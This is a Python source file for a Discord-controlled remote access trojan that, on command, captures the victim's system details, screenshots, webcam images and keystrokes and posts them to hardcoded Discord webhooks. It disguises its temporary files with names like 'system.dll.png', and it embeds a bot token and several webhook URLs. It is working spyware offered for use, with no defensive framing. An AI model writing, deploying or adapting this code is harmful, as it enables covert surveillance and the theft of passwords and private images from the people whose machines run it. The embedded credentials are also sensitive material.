import time
import requests
import pyautogui
import cv2
import platform
import psutil
import socket
import os
import pynput
import threading
import discord
from discord.ext import commands

TOKEN = "MTM1MzgyNTE0OTE2MTU3NDQxMQ.GRvust.mbw9hWmrFjTvImsqIuPKLsHWaOP3WUksiJsHHo"

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

@bot.command()
async def test(ctx):
    await ctx.send("ok")

@bot.command()
async def options(ctx):
    commands_list = """```
!sysinfo       - Captures system info
!ss            - Captures a screenshot
!webcam        - Captures webcam footage
!startkeylog   - Begins logging keystrokes
!stopkeylog    - Stops logging keystrokes
```"""
    await ctx.send(commands_list)

@bot.command()
async def ss(ctx):
    await send_screenshot()

@bot.command()
async def webcam(ctx):
    await send_webcam_snapshot()

@bot.command()
async def sysinfo(ctx):
    await send_system_info()

keylogger_running = False  # Flag to control the keylogger thread
keylogger_thread = None  # Store the thread reference

def start_keylogger():
    global keylogger_running
    keylogger_running = True
    
    while keylogger_running:
        print("Logging keys...")  # Replace this with actual keylogging logic
        time.sleep(1)  # Simulated delay

    print("Keylogger stopped.")  # This prints when stopping

@bot.command()
async def startkeylog(ctx):
    global keylogger_running, keylogger_thread

    if keylogger_running:
        await ctx.send("Keylogger active")
        return

    await ctx.send("Starting keylogger...")
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

@bot.command()
async def stopkeylog(ctx):
    global keylogger_running

    if not keylogger_running:
        await ctx.send("Keylogger is not running!")
        return

    await ctx.send("Stopping keylogger...")
    keylogger_running = False  # This tells the loop in start_keylogger to stop

    # Wait for the thread to finish
    if keylogger_thread:
        keylogger_thread.join()

    await ctx.send("Keylogger stopped.")


ss = "https://discord.com/api/webhooks/1353832790260449421/NZneLvkLuA5GK7Hav1VOSCjhzvPuMN9UaDAWX4Inpb0LNj9CpAjJj6nqAb-qzr8NyqYq"
web = "https://discord.com/api/webhooks/1353833076865892515/qglIfx45kLyXdX0BMgAfnJawxLUgQMU6hIdoEQqsMgIeysrWGLWGUP9aHFtJUt1MDs2n"
si = "https://discord.com/api/webhooks/1353833244524679320/CXguOTiQBaVmzfVqjOdw3xWtlocuU7L3dXd9Rrc8i81rWsDa9yjSQpxUsN0fxX_bCnHX"
keylog_webhook = "https://discord.com/api/webhooks/1353833152946114631/S5SJPPaECCQPhDzLKzYKeMehm3ghJaSbA5b75l8Y-uxIfxBb01emGynkMSmWFqNvzqS6"





#ss = "https://discord.com/api/webhooks/1313517580299927614/3n8CCQeVdLzTdzU6UCNfCl4yBsekla-vaReMUIYymrNTpKkgq8MAG9DE9k8TpcoqFfaC"
#web = "https://discord.com/api/webhooks/1350538892033658993/OwNy7nrwv1899QZWbkLSJq2Id1178n2cCaQAhRyMVGifby5Ytn1_Vk3LxibpK06a9rWG"
#si = "https://discord.com/api/webhooks/1313517481846898690/YGSc5vJfM2W7c4GuLcSH38kf3Sx3gSZUjePRNmyx3Gr7BEJY4sC2Zg2-0KuGD2fdZBiC"
#keylog_webhook = "https://discord.com/api/webhooks/1313517666925019187/IWB6Da-Cnh3GJLONxr9xDNfymG9BZ1sXWvCA207U0ZGDbqdOAD_tZnatU2ZETTX1oHKY"

def get_system_info():
    info2 = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.architecture()[0],
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "RAM Size (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "Disk Space (GB)": round(psutil.disk_usage('/').total / (1024 ** 3), 2),
        "Available Disk (GB)": round(psutil.disk_usage('/').free / (1024 ** 3), 2),
    }
    return info2

def send_system_info():
    info = get_system_info()
    formatted_info = "\n".join([f"**{key}:** {value}" for key, value in info.items()])

    payload = {"content": f"```yaml\n{formatted_info}\n```"}
    response = requests.post(si, json=payload)
    
    if response.status_code == 200:
        print("System info sent successfully.")
    else:
        print(f"Failed to send system info: {response.status_code}")

def send_screenshot():
    screenshot_path = "system.dll.png"
    pyautogui.screenshot(screenshot_path)

    with open(screenshot_path, "rb") as file:
        response = requests.post(ss, files={"file": file})
    
    os.remove(screenshot_path)

    if response.status_code == 200:
        print("Screenshot sent successfully.")
    else:
        print(f"Failed to send screenshot: {response.status_code}")

def send_webcam_snapshot():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if ret:
        snapshot_path = "windows64.dll.jpg"
        cv2.imwrite(snapshot_path, frame)

        with open(snapshot_path, "rb") as file:
            response = requests.post(web, files={"file": file})
        
        os.remove(snapshot_path)

        if response.status_code == 200:
            print("Webcam snapshot sent successfully.")
        else:
            print(f"Failed to send webcam snapshot: {response.status_code}")
    else:
        print("Failed to capture webcam snapshot.")

def send_key(key):
    try:
        key = key.char
    except AttributeError:
        key = str(key)

    payload = {"content": f"**Key Pressed:** `{key}`"}
    response = requests.post(keylog_webhook, json=payload)

    if response.status_code == 200:
        print(f"Key '{key}' sent successfully.")
    else:
        print(f"Failed to send key '{key}': {response.status_code}")

def start_keylogger():
    with pynput.keyboard.Listener(on_press=send_key) as listener:
        listener.join()



bot.run(TOKEN)
